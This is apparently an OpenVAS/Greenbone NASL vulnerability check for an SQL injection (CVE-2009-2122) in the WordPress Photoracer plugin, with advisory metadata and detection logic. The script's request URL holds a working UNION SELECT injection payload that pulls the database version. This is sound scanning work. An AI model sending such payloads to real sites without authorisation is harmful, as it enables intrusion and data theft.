# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901204");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-08-29 16:22:41 +0200 (Mon, 29 Aug 2011)");
  script_cve_id("CVE-2009-2122");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Photoracer Plugin 'id' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35450");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35382");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/51152");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17720");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/photoracer");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to perform SQL Injection
  attack and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress Photoracer plugin version 1.0");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  passed via the 'id' parameter to '/wp-content/plugins/photoracer/viewimg.php',
  which allows attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The WordPress plugin 'Photoracer' is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/photoracer/viewimg.php?id=-1%20UNION%20SELECT%200,1,2,3,4,CONCAT(0x6f762d73716c2d696e6a2d74657374,0x3a,@@version,0x3a,0x6f762d73716c2d696e6a2d74657374),6,7,8";

if(http_vuln_check(port:port, url:url, pattern:">ov-sql-inj-test:[0-9]+.*:ov-sql-inj-test<")){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
